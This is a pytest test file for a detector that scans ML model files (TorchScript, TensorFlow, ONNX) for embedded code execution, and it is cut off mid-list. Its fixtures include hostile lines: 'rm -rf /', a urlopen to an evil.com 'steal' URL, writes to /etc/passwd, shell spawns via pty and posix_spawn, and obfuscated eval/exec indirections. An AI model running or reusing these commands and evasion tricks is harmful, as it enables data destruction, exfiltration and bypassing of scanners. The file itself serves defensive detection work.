"""Tests for JIT/Script code execution detection."""

from pathlib import Path

import pytest

from modelaudit.detectors import jit_script as jit_script_module
from modelaudit.detectors.jit_script import JITScriptDetector, detect_jit_script_risks


class TestJITScriptDetector:
    """Test the JITScriptDetector class."""

    def test_detect_dangerous_torch_ops(self):
        """Test detection of dangerous TorchScript operations."""
        detector = JITScriptDetector()

        # Create fake TorchScript data with dangerous operations
        data = b"""
        TorchScript-1.0
        def forward(self, x):
            torch.ops.aten.system("rm -rf /")
            torch.ops.aten.exec("malicious code")
            return x
        """

        findings = detector.scan_torchscript(data, "test_model.pt")
        assert len(findings) >= 2
        assert any("torch.ops.aten.system" in getattr(f, "pattern", getattr(f, "operation", "")) for f in findings)
        assert any("torch.ops.aten.exec" in getattr(f, "pattern", getattr(f, "operation", "")) for f in findings)
        assert all(
            getattr(f, "severity", getattr(f, "severity", "")) == "CRITICAL"
            for f in findings
            if hasattr(f, "pattern") or hasattr(f, "operation")
        )

    def test_detect_torch_jit_compilation(self):
        """Test detection of TorchScript JIT compilation."""
        detector = JITScriptDetector({"strict_mode": True})

        # Create data with JIT markers
        data = b"""
        torch.jit.script
        @torch.jit.compile
        def model_func():
            pass
        """

        findings = detector.scan_torchscript(data, "jit_model.pt")
        assert any(f.type == "jit_usage" for f in findings)

    def test_detect_embedded_pickle_in_torch(self):
        """Test detection of embedded pickle in TorchScript."""
        detector = JITScriptDetector()

        # Simulate TorchScript with pickle opcodes
        data = b"TorchScript\x00GLOBAL torch.nn Module\x00"

        findings = detector.scan_torchscript(data)
        assert any(f.type == "embedded_pickle" for f in findings)
        assert any("pickle" in f.message.lower() for f in findings)

    def test_detect_dangerous_tf_ops(self):
        """Test detection of dangerous TensorFlow operations."""
        detector = JITScriptDetector()

        # Create fake TensorFlow SavedModel data
        data = b"""
        saved_model.pb
        tf.py_func(lambda x: exec('malicious'), [input])
        tf.numpy_function(dangerous_func, [x], tf.float32)
        """

        findings = detector.scan_tensorflow(data, "model.pb")
        assert len(findings) >= 2
        assert any(f.operation is not None and "tf.py_func" in f.operation for f in findings)
        assert any(f.operation is not None and "tf.numpy_function" in f.operation for f in findings)

    def test_detect_keras_lambda_layers(self):
        """Test detection of Keras Lambda layers."""
        detector = JITScriptDetector()

        # Create data with Keras Lambda layer
        data = b"""
        tensorflow.keras.layers.Lambda
        lambda x: eval(x)
        """

        findings = detector.scan_tensorflow(data)
        assert any(f.type == "lambda_layer" for f in findings)
        assert any("Lambda" in f.message for f in findings)

    def test_detect_onnx_custom_operators(self):
        """Test detection of ONNX custom operators."""
        detector = JITScriptDetector()

        # Create fake ONNX data with custom operators
        data = b"""
        ai.onnx.contrib.custom_op
        PythonOp: eval_code
        """

        findings = detector.scan_onnx(data, "model.onnx")
        assert any(f.type == "custom_operator" for f in findings)
        assert any(f.type == "python_operator" for f in findings)

    def test_detect_dangerous_imports_in_code(self):
        """Test detection of dangerous imports in embedded code."""
        detector = JITScriptDetector()

        # Create data with embedded Python code containing dangerous imports
        data = b"""
        def malicious_function():
            import os
            import subprocess
            os.system('evil command')
            subprocess.call(['rm', '-rf', '/'])
        """

        findings = detector._extract_and_check_python_code(data, "Test", "test.model")
        assert any("os" in getattr(f, "import_", "") for f in findings)
        assert any("subprocess" in getattr(f, "import_", "") for f in findings)
        assert any(f.severity == "CRITICAL" for f in findings)

    def test_known_dangerous_import_reuses_compiled_patterns(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Known import checks should not rebuild regex source at call time."""

        def fail_escape(_value: str) -> str:
            raise AssertionError("known import checks should reuse compiled patterns")

        monkeypatch.setattr(jit_script_module.re, "escape", fail_escape)

        assert JITScriptDetector._contains_dangerous_import("import os\n", "os") is True

    def test_scan_torchscript_checks_unmarked_python_blobs(self) -> None:
        """Raw Python payloads should be analyzed even without TorchScript markers."""
        detector = JITScriptDetector()
        data = b"""
        def payload():
            import os
            return os.system("echo pwned")
        """

        findings = detector.scan_torchscript(data, "opaque.bin")

        assert any(getattr(finding, "import_", "") == "os" for finding in findings)

    def test_detect_dangerous_builtins(self):
        """Test detection of dangerous builtins like eval, exec."""
        detector = JITScriptDetector()

        data = b"""
        def process_input(x):
            result = eval(x)
            exec(compile(x, 'string', 'exec'))
            return __import__('os').system(result)
        """

        findings = detector._extract_and_check_python_code(data, "Test", "test.model")
        assert any("eval" in getattr(f, "builtin", "") for f in findings)
        assert any("exec" in getattr(f, "builtin", "") for f in findings)
        assert any("__import__" in getattr(f, "builtin", "") for f in findings)

    def test_detect_code_execution_patterns(self):
        """Test detection of code execution patterns in binary data."""
        detector = JITScriptDetector()

        # Create data with various execution patterns
        data = b"""
        subprocess.run(['malicious', 'command'])
        os.system('rm -rf /')
        socket.create_connection(('evil.com', 1337))
        urllib.request.urlopen('http://evil.com/steal')
        open('/etc/passwd', 'w').write('hacked')
        """

        findings = detector._extract_and_check_python_code(data, "Test", "test.model")
        assert any("subprocess" in getattr(f, "pattern", "").lower() for f in findings)
        assert any("os command" in getattr(f, "pattern", "").lower() for f in findings)
        assert any("socket" in getattr(f, "pattern", "").lower() for f in findings)

    def test_auto_detect_model_type(self) -> None:
        """Test automatic model type detection."""
        detector = JITScriptDetector()

        # Test PyTorch detection
        pytorch_data = b"TorchScript model data"
        pytorch_findings = detector.scan_model(pytorch_data, "unknown")
        assert isinstance(pytorch_findings, list)

        # Test TensorFlow detection
        tf_data = b"saved_model.pb tensorflow data"
        tf_findings = detector.scan_model(tf_data, "unknown")
        assert isinstance(tf_findings, list)

        # Test ONNX detection
        onnx_data = b"ai.onnx model data"
        onnx_findings = detector.scan_model(onnx_data, "unknown")
        assert isinstance(onnx_findings, list)

    def test_scan_model_detects_unmarked_dangerous_python_source(self) -> None:
        detector = JITScriptDetector()
        data = b"""
        def payload():
            import os
            return eval("1 + 1") or os.system("id")
        """

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(f.type == "dangerous_import" and f.import_ == "os" for f in findings)
        assert any(f.type == "dangerous_builtin" and f.builtin == "eval" for f in findings)

    @pytest.mark.parametrize(
        ("model_type", "data"),
        [
            ("pytorch", b"def payload():\n    import os\n    return os.system('id')\n"),
            ("unknown", b"def payload():\n    import os\n    return os.system('id')\n"),
            (
                "tensorflow",
                b"SavedFunction = True\npython_function = True\n"
                b"def payload():\n    import os\n    return os.system('id')\n",
            ),
            ("pickle", b"def payload():\n    import os\n    return os.system('id')\n"),
        ],
    )
    def test_scan_model_reports_complete_dangerous_python_source_once(self, model_type: str, data: bytes) -> None:
        findings = JITScriptDetector().scan_model(data, model_type, "payload.bin")
        identities = [
            (finding.type, finding.message, finding.pattern, finding.operation, finding.builtin, finding.import_)
            for finding in findings
        ]

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "OS command execution detected"
            for finding in findings
        )
        assert len(identities) == len(set(identities))

    def test_scan_model_keeps_dangerous_python_extraction_from_binary_torchscript_blob(self) -> None:
        data = b"\x00binary model prefix\ndef payload():\n    import os\n    return os.system('id')\n"

        findings = JITScriptDetector().scan_model(data, "pytorch", "payload.bin")

        assert any(finding.type == "dangerous_import" and finding.import_ == "os" for finding in findings)
        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "OS command execution detected"
            for finding in findings
        )

    def test_scan_model_ignores_unmarked_benign_python_source(self) -> None:
        detector = JITScriptDetector()
        data = b"""
        def normalize(values):
            total = sum(values)
            return [value / total for value in values]
        """

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert findings == []

    def test_scan_model_ignores_non_source_dangerous_text(self) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(b"metadata says eval( is unsupported", "pytorch", "payload.bin")

        assert findings == []

    def test_scan_model_detects_unmarked_module_scope_python_source(self) -> None:
        detector = JITScriptDetector()
        findings = detector.scan_model(b"import os\nos.system('id')\n", "pytorch", "payload.bin")

        assert any(f.type == "dangerous_import" and f.import_ == "os" for f in findings)

    @pytest.mark.parametrize(
        "source",
        [
            b"def payload():\n    return os.posix_spawn('/bin/sh', ['sh'], {})\n",
            b"def payload():\n    return os.posix_spawnp('sh', ['sh'], {})\n",
            b"def payload():\n    return os.startfile('payload.exe')\n",
            b"def payload():\n    from os import spawnv as run\n    return run(0, '/bin/sh', ['sh'])\n",
        ],
    )
    def test_scan_model_detects_unmarked_os_process_launch(self, source: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "source",
        [
            b"def payload():\n    os.system = len\n    return os.system([])\n",
            b"def payload():\n    os.posix_spawn = len\n    return os.posix_spawn([])\n",
            b"def payload():\n    os.startfile = len\n    return os.startfile([])\n",
        ],
    )
    def test_scan_model_ignores_certain_replaced_os_process_launch(self, source: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert findings == []

    def test_scan_model_preserves_possible_os_process_launch_after_conditional_replacement(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"def payload():\n"
            b"    if replace:\n"
            b"        os.posix_spawn = len\n"
            b"    return os.posix_spawn('/bin/sh', ['sh'], {})\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "OS command execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "source",
        [
            b"def payload():\n    return subprocess.check_call(['id'])\n",
            b"def payload():\n    return subprocess.getoutput('id')\n",
            b"def payload():\n    return subprocess.getstatusoutput('id')\n",
            b"def payload():\n    from subprocess import check_call as run\n    return run(['id'])\n",
        ],
    )
    def test_scan_model_detects_unmarked_subprocess_process_launch(self, source: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Subprocess execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "source",
        [
            b"def payload():\n    subprocess.run = len\n    return subprocess.run([])\n",
            b"def payload():\n    subprocess.check_call = len\n    return subprocess.check_call([])\n",
            b"def payload():\n    subprocess.getoutput = len\n    return subprocess.getoutput([])\n",
        ],
    )
    def test_scan_model_ignores_certain_replaced_subprocess_process_launch(self, source: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert findings == []

    def test_scan_model_preserves_possible_subprocess_launch_after_conditional_replacement(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"def payload():\n"
            b"    if replace:\n"
            b"        subprocess.check_call = len\n"
            b"    return subprocess.check_call(['id'])\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Subprocess execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "source",
        [
            b"async def payload():\n    return await asyncio.create_subprocess_exec('/bin/sh', '-c', 'id')\n",
            b"async def payload():\n    return await asyncio.create_subprocess_shell('id')\n",
            (
                b"async def payload():\n    from asyncio import create_subprocess_shell as run\n"
                b"    return await run('id')\n"
            ),
        ],
    )
    def test_scan_model_detects_unmarked_asyncio_process_launch(self, source: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Subprocess execution detected" for f in findings
        )

    def test_scan_model_ignores_certain_replaced_asyncio_process_launch(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"async def payload():\n"
            b"    asyncio.create_subprocess_shell = len\n"
            b"    return asyncio.create_subprocess_shell([])\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert findings == []

    def test_scan_model_preserves_possible_asyncio_process_launch_after_conditional_replacement(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"async def payload():\n"
            b"    if replace:\n"
            b"        asyncio.create_subprocess_exec = len\n"
            b"    return await asyncio.create_subprocess_exec('/bin/sh', '-c', 'id')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Subprocess execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "source",
        [
            b"def payload():\n    return pty.spawn('/bin/sh')\n",
            b"def payload():\n    from pty import spawn as run\n    return run('/bin/sh')\n",
        ],
    )
    def test_scan_model_detects_unmarked_pty_process_launch(self, source: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Pseudo-terminal process execution detected"
            for f in findings
        )

    def test_scan_model_ignores_certain_replaced_pty_process_launch(self) -> None:
        detector = JITScriptDetector()
        source = b"def payload():\n    pty.spawn = len\n    return pty.spawn([])\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert findings == []

    def test_scan_model_preserves_possible_pty_launch_after_conditional_replacement(self) -> None:
        detector = JITScriptDetector()
        source = b"def payload():\n    if replace:\n        pty.spawn = len\n    return pty.spawn('/bin/sh')\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Pseudo-terminal process execution detected"
            for f in findings
        )

    @pytest.mark.parametrize(
        "source",
        [
            b"def payload():\n    return runpy.run_module('payload')\n",
            b"def payload():\n    from runpy import run_path as run\n    return run('payload.py')\n",
        ],
    )
    def test_scan_model_detects_unmarked_runpy_execution(self, source: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_ignores_certain_replaced_runpy_execution(self) -> None:
        detector = JITScriptDetector()
        source = b"def payload():\n    runpy.run_path = len\n    return runpy.run_path([])\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert findings == []

    def test_scan_model_preserves_possible_runpy_execution_after_conditional_replacement(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"def payload():\n    if replace:\n        runpy.run_path = len\n    return runpy.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "source",
        [
            b"def payload():\n    return webbrowser.open('https://evil.example')\n",
            b"def payload():\n    from webbrowser import open_new as launch\n    return launch('https://evil.example')\n",
            b"def payload():\n    return webbrowser.open_new_tab('https://evil.example')\n",
        ],
    )
    def test_scan_model_detects_unmarked_webbrowser_launch(self, source: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(f.type == "code_execution_pattern" and f.pattern == "Web browser launch detected" for f in findings)

    def test_scan_model_ignores_certain_replaced_webbrowser_launch(self) -> None:
        detector = JITScriptDetector()
        source = b"def payload():\n    webbrowser.open = len\n    return webbrowser.open([])\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert findings == []

    def test_scan_model_preserves_possible_webbrowser_launch_after_conditional_replacement(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"def payload():\n"
            b"    if replace:\n"
            b"        webbrowser.open = len\n"
            b"    return webbrowser.open('https://evil.example')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(f.type == "code_execution_pattern" and f.pattern == "Web browser launch detected" for f in findings)

    @pytest.mark.parametrize(
        "source",
        [
            b"def payload():\n    return ctypes.CDLL('./payload.so')\n",
            b"def payload():\n    return ctypes.OleDLL('payload.dll')\n",
            b"def payload():\n    return ctypes.PyDLL('./payload.so')\n",
            b"def payload():\n    return ctypes.WinDLL('payload.dll')\n",
            b"def payload():\n    return ctypes.cdll.LoadLibrary('./payload.so')\n",
            b"def payload():\n    return ctypes.oledll.LoadLibrary('payload.dll')\n",
            b"def payload():\n    return ctypes.pydll.LoadLibrary('./payload.so')\n",
            b"def payload():\n    return ctypes.windll.LoadLibrary('payload.dll')\n",
            b"def payload():\n    from ctypes import CDLL as load\n    return load('./payload.so')\n",
            b"def payload():\n    return ctypes.LibraryLoader(ctypes.CDLL).LoadLibrary('./payload.so')\n",
            b"def payload():\n    return ctypes.cdll.msvcrt.printf(b'hi')\n",
            b"def payload():\n    import _ctypes\n    return _ctypes.dlopen('libc.so.6')\n",
        ],
    )
    def test_scan_model_detects_unmarked_ctypes_native_loading(self, source: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Native library loading detected" for f in findings
        )

    @pytest.mark.parametrize(
        "source",
        [
            b"def payload():\n    ctypes.CDLL = len\n    return ctypes.CDLL([])\n",
            b"def payload():\n    ctypes.cdll.LoadLibrary = len\n    return ctypes.cdll.LoadLibrary([])\n",
            b"def payload():\n    ctypes.cdll.msvcrt = len\n    return ctypes.cdll.msvcrt([])\n",
        ],
    )
    def test_scan_model_ignores_certain_replaced_ctypes_native_loading(self, source: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert findings == []

    def test_scan_model_preserves_possible_ctypes_native_loading_after_conditional_replacement(self) -> None:
        detector = JITScriptDetector()
        source = b"def payload():\n    if replace:\n        ctypes.CDLL = len\n    return ctypes.CDLL('./payload.so')\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Native library loading detected" for f in findings
        )

    @pytest.mark.parametrize(
        "source",
        [
            b"getattr(__builtins__, 'eval')('1 + 1')\n",
            b"__builtins__['eval']('1 + 1')\n",
            b"getattr(__builtins__, 'ev' + 'al')('1 + 1')\n",
            b"__builtins__.__dict__['ev' + 'al']('1 + 1')\n",
            b"__builtins__.__dict__.get('ev' + 'al')('1 + 1')\n",
            b"__builtins__.__dict__.__getitem__('eval')('1 + 1')\n",
            b"import builtins\nbuiltins.eval('1 + 1')\n",
            b"import builtins as bi\ngetattr(bi, 'ev' + 'al')('1 + 1')\n",
            b"from builtins import eval as run\nrun('1 + 1')\n",
            b"globals()['__builtins__']['ev' + 'al']('1 + 1')\n",
            b"globals().get('__builtins__').get('eval')('1 + 1')\n",
            b"getattr(globals()['__builtins__'], 'eval')('1 + 1')\n",
            b"namespace = globals()\nnamespace['__builtins__']['ev' + 'al']('1 + 1')\n",
            b"namespace = globals()\nnamespace.get('__builtins__').get('eval')('1 + 1')\n",
            b"namespace = globals()\ngetattr(namespace['__builtins__'], 'eval')('1 + 1')\n",
            b"lookup = globals().get\nlookup('__builtins__').get('ev' + 'al')('1 + 1')\n",
            (b"namespace = globals()\nlookup = namespace.get\nlookup('__builtins__')['ev' + 'al']('1 + 1')\n"),
            b"lookup = globals()['__builtins__'].get\nlookup('ev' + 'al')('1 + 1')\n",
            b"lookup = globals()['__builtins__'].__getitem__\nlookup('ev' + 'al')('1 + 1')\n",
            b"eval.__call__('1 + 1')\n",
            b"run = globals()['__builtins__']['eval']\nrun.__call__('1 + 1')\n",
            (b"run = globals()['__builtins__']['eval']\nglobals()['__builtins__']['eval'] = len\nrun('1 + 1')\n"),
            (
                b"run = globals()['__builtins__']['eval']\n"
                b"globals()['__builtins__']['eval'] = len\n"
                b"run.__call__('1 + 1')\n"
            ),
            (
                b"invoke = globals()['__builtins__']['eval'].__call__\n"
                b"globals()['__builtins__']['eval'] = len\n"
                b"invoke('1 + 1')\n"
            ),
            (
                b"run = globals()['__builtins__']['eval']\n"
                b"globals()['__builtins__'].__setitem__('eval', len)\n"
                b"run('1 + 1')\n"
            ),
            (
                b"run = globals()['__builtins__']['eval']\n"
                b"replace = globals()['__builtins__'].__setitem__\n"
                b"replace('eval', len)\n"
                b"run('1 + 1')\n"
            ),
            (
                b"run = globals()['__builtins__']['eval']\n"
                b"globals()['__builtins__']['eval'] = __builtins__['exec']\n"
                b"run('1 + 1')\n"
            ),
            b"import builtins\nbuiltins.__dict__.pop('eval')('pass')\n",
            b"import builtins\nrun = builtins.__dict__.pop('eval')\nrun('pass')\n",
            b"import builtins\nif remove:\n    del builtins.__dict__['eval']\nbuiltins.eval('pass')\n",
            b"import builtins\nrun = builtins.eval\nbuiltins.__dict__.clear()\nrun('pass')\n",
            b"import builtins\nif remove:\n    builtins.__dict__.clear()\nbuiltins.eval('pass')\n",
        ],
    )
    def test_scan_model_detects_unmarked_static_builtin_indirection(self, source: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(f.type == "ast_dangerous_call" and f.builtin == "eval" for f in findings)

    @pytest.mark.parametrize(
        ("source", "builtin"),
        [
            (b"import builtins as bi\nbi.open('result.txt', 'w')\n", "open"),
            (b"import builtins as bi\ngetattr(bi, 'op' + 'en')('result.txt', 'w')\n", "open"),
            (b"from builtins import compile as build\nbuild('x = 1', '<x>', 'exec')\n", "compile"),
        ],
    )
    def test_scan_model_detects_aliased_modeled_builtin_operations(self, source: bytes, builtin: str) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(f.type == "ast_dangerous_call" and f.builtin == builtin for f in findings)

    @pytest.mark.parametrize(
        "source",
        [
            b"callbacks = {'eval': len}\ncallbacks['eval']([])\n",
            b"import builtins as bi\nbi.len([1])\n",
            b"globals()['__builtins__']['len']([1])\n",
            b"globals = lambda: {'__builtins__': {'eval': len}}\nglobals()['__builtins__']['eval']([])\n",
            b"namespace = globals()\nnamespace['__builtins__']['len']([1])\n",
            (
                b"namespace = globals()\n"
                b"namespace = {'__builtins__': {'eval': len}}\n"
                b"namespace['__builtins__']['eval']([])\n"
            ),
            (
                b"namespace = globals()\n"
                b"namespace['__builtins__']['eval'] = len\n"
                b"namespace['__builtins__']['eval']([])\n"
            ),
            b"__builtins__['eval'] = len\n__builtins__['eval']([])\n",
            b"import builtins\nbuiltins.eval = len\nbuiltins.eval([])\n",
            b"lookup = globals().get\nlookup('__builtins__').get('len')([1])\n",
            b"mapping = {'eval': len}\nlookup = mapping.get\nlookup('eval')([])\n",
            b"globals()['__builtins__'].__setitem__('eval', len)\nglobals()['__builtins__']['eval']([])\n",
            b"globals()['__builtins__'].update({'eval': len})\nglobals()['__builtins__']['eval']([])\n",
            (
                b"replace = globals()['__builtins__'].__setitem__\n"
                b"replace('eval', len)\n"
                b"globals()['__builtins__']['eval']([])\n"
            ),
            (
                b"replace = globals()['__builtins__'].update\n"
                b"replace({'eval': len})\n"
                b"globals()['__builtins__']['eval']([])\n"
            ),
            (b"globals()['__builtins__']['eval'] = len\nrun = globals()['__builtins__']['eval']\nrun([])\n"),
            (b"globals()['__builtins__'].__setitem__('eval', len)\nrun = globals()['__builtins__']['eval']\nrun([])\n"),
            (
                b"replace = globals()['__builtins__'].__setitem__\n"
                b"replace('eval', len)\n"
                b"run = globals()['__builtins__']['eval']\n"
                b"run([])\n"
            ),
            (b"globals()['__builtins__']['eval'] = len\nrun = globals()['__builtins__']['eval']\nrun.__call__([])\n"),
            (
                b"globals()['__builtins__']['eval'] = len\n"
                b"invoke = globals()['__builtins__']['eval'].__call__\n"
                b"invoke([])\n"
            ),
            b"import builtins\nsetattr(builtins, 'eval', len)\nbuiltins.eval([])\n",
            b"import builtins\nresult = setattr(builtins, 'eval', len)\nbuiltins.eval([])\n",
            (b"import builtins as bi\nfrom builtins import setattr as assign\nassign(bi, 'eval', len)\nbi.eval([])\n"),
            b"import builtins\nbuiltins.__dict__.update({'eval': len})\nbuiltins.eval([])\n",
            b"import builtins\nreplace = builtins.__dict__.update\nreplace({'eval': len})\nbuiltins.eval([])\n",
            b"import builtins\ngetattr(builtins, '__dict__').update({'eval': len})\nbuiltins.eval([])\n",
            b"import builtins\nnamespace = builtins.__dict__\nnamespace.update({'eval': len})\nbuiltins.eval([])\n",
            b"import builtins\ndict.update(builtins.__dict__, {'eval': len})\nbuiltins.eval([])\n",
            b"import builtins\nimport operator\noperator.setitem(builtins.__dict__, 'eval', len)\nbuiltins.eval([])\n",
            b"import builtins\nbuiltins.__dict__.pop('eval')\nbuiltins.eval([])\n",
            b"import builtins\ndict.pop(builtins.__dict__, 'eval')\nbuiltins.eval([])\n",
            b"import builtins\ndel builtins.__dict__['eval']\nbuiltins.eval([])\n",
            b"import builtins\nbuiltins.__dict__.__delitem__('eval')\nbuiltins.eval([])\n",
            b"import builtins\nimport operator\noperator.delitem(builtins.__dict__, 'eval')\nbuiltins.eval([])\n",
            b"import builtins\nbuiltins.__dict__.clear()\nbuiltins.eval([])\n",
            b"import builtins\nclear = builtins.__dict__.clear\nclear()\nbuiltins.eval([])\n",
            b"import builtins\ndict.clear(builtins.__dict__)\nbuiltins.eval([])\n",
            b"def payload():\n    eval = len\n    return eval([])\n",
            (
                b"def payload():\n"
                b"    namespace = globals()\n"
                b"    namespace['__builtins__']['eval'] = len\n"
                b"    return namespace['__builtins__']['eval']([])\n"
            ),
        ],
    )
    def test_scan_model_ignores_benign_builtin_shaped_access(self, source: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert findings == []

    @pytest.mark.parametrize(
        "source",
        [
            (
                b"namespace = globals()\n"
                b"namespace['__builtins__']['eval'] = __builtins__['exec']\n"
                b"namespace['__builtins__']['eval']('pass')\n"
            ),
            (
                b"globals()['__builtins__'].__setitem__('eval', __builtins__['exec'])\n"
                b"globals()['__builtins__']['eval']('pass')\n"
            ),
            (
                b"globals()['__builtins__'].update({'eval': __builtins__['exec']})\n"
                b"globals()['__builtins__']['eval']('pass')\n"
            ),
            (
                b"replace = globals()['__builtins__'].__setitem__\n"
                b"replace('eval', __builtins__['exec'])\n"
                b"globals()['__builtins__']['eval']('pass')\n"
            ),
            (
                b"replace = globals()['__builtins__'].update\n"
                b"replace({'eval': __builtins__['exec']})\n"
                b"globals()['__builtins__']['eval']('pass')\n"
            ),
            (
                b"globals()['__builtins__']['eval'] = __builtins__['exec']\n"
                b"globals()['__builtins__']['exec'] = len\n"
                b"globals()['__builtins__']['eval']('pass')\n"
            ),
            b"import builtins\nsetattr(builtins, 'eval', builtins.exec)\nbuiltins.eval('pass')\n",
            b"import builtins\nbuiltins.__dict__.update({'eval': builtins.exec})\nbuiltins.eval('pass')\n",
            b"import builtins\ngetattr(builtins, '__dict__').update({'eval': builtins.exec})\nbuiltins.eval('pass')\n",
            (
                b"import builtins\nnamespace = builtins.__dict__\n"
                b"namespace.update({'eval': builtins.exec})\nbuiltins.eval('pass')\n"
            ),
            b"import builtins\ndict.update(builtins.__dict__, {'eval': builtins.exec})\nbuiltins.eval('pass')\n",
            (
                b"import builtins\nimport operator\n"
                b"operator.setitem(builtins.__dict__, 'eval', builtins.exec)\nbuiltins.eval('pass')\n"
            ),
            (
                b"import builtins\nrun = builtins.exec\nbuiltins.__dict__.clear()\n"
                b"builtins.__dict__.update({'eval': run})\nbuiltins.eval('pass')\n"
            ),
        ],
    )
    def test_scan_model_detects_dangerous_builtin_reassignment(self, source: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(f.type == "ast_dangerous_call" and f.builtin == "exec" for f in findings)

    @pytest.mark.parametrize(
        "source",
        [
            (
                b"namespace = globals()\n"
                b"if replace_builtin:\n"
                b"    namespace['__builtins__']['eval'] = len\n"
                b"namespace['__builtins__']['eval']('1 + 1')\n"
            ),
            (
                b"if replace_builtin:\n"
                b"    globals()['__builtins__'].__setitem__('eval', len)\n"
                b"globals()['__builtins__']['eval']('1 + 1')\n"
            ),
            (
                b"if replace_builtin:\n"
                b"    globals()['__builtins__'].update({'eval': len})\n"
                b"globals()['__builtins__']['eval']('1 + 1')\n"
            ),
            (
                b"get_names = globals\n"
                b"if replace_globals:\n"
                b"    get_names = lambda: {'__builtins__': {'eval': len}}\n"
                b"get_names()['__builtins__'].__setitem__('eval', len)\n"
                b"globals()['__builtins__']['eval']('1 + 1')\n"
            ),
            (
                b"replace = globals()['__builtins__'].__setitem__\n"
                b"if replace_mutator:\n"
                b"    replace = lambda key, value: None\n"
                b"replace('eval', len)\n"
                b"globals()['__builtins__']['eval']('1 + 1')\n"
            ),
            (
                b"replace = globals()['__builtins__'].update\n"
                b"if replace_mutator:\n"
                b"    replace = lambda values: None\n"
                b"replace({'eval': len})\n"
                b"globals()['__builtins__']['eval']('1 + 1')\n"
            ),
            (
                b"replace = globals()['__builtins__'].__setitem__\n"
                b"from helpers import replace\n"
                b"replace('eval', len)\n"
                b"globals()['__builtins__']['eval']('1 + 1')\n"
            ),
            (
                b"replace = globals()['__builtins__'].update\n"
                b"import helpers as replace\n"
                b"replace({'eval': len})\n"
                b"globals()['__builtins__']['eval']('1 + 1')\n"
            ),
            (b"import builtins\nif replace_builtin:\n    setattr(builtins, 'eval', len)\nbuiltins.eval('1 + 1')\n"),
            (
                b"import builtins\n"
                b"setattr = lambda target, key, value: None\n"
                b"setattr(builtins, 'eval', len)\n"
                b"builtins.eval('1 + 1')\n"
            ),
            (
                b"import builtins\n"
                b"try:\n"
                b"    setattr(builtins, 'eval', len)\n"
                b"except Exception:\n"
                b"    pass\n"
                b"builtins.eval('1 + 1')\n"
            ),
            (
                b"import builtins\n"
                b"if replace_builtin:\n"
                b"    builtins.__dict__.update({'eval': len})\n"
                b"builtins.eval('1 + 1')\n"
            ),
            (
                b"import builtins\n"
                b"replace = builtins.__dict__.update\n"
                b"replace = lambda values: None\n"
                b"replace({'eval': len})\n"
                b"builtins.eval('1 + 1')\n"
            ),
            (
                b"import builtins\n"
                b"if swap:\n"
                b"    builtins = make_namespace()\n"
                b"builtins.__dict__.update({'eval': len})\n"
                b"builtins.eval('1 + 1')\n"
            ),
            (
                b"import builtins\n"
